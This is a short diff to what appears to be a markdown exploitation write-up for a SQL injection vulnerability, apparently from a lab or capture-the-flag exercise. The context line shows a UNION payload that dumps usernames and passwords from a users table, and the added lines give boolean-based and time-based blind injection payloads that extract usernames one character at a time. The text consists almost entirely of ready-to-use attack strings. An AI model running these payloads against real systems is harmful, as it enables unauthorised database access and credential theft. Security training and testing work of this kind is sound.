@@ -32,4 +32,8 @@
 
 5. Dumping users table: `' UNION SELECT NULL, username, password, NULL, NULL from users %23`
 
+# Exploit(blind)
 
+1. Extracting users with a boolean-based vulnerability: `' OR (SELECT SUBSTRING(username, 1, 1) FROM users order by id limit 0,1) = 'a' %23`
+
+2. Extracting users with a time-based vulnerability: `' OR IF(SUBSTRING((SELECT username FROM users order by id limit 0,1), 1, 1) = 'b', SLEEP(1), 0) %23`
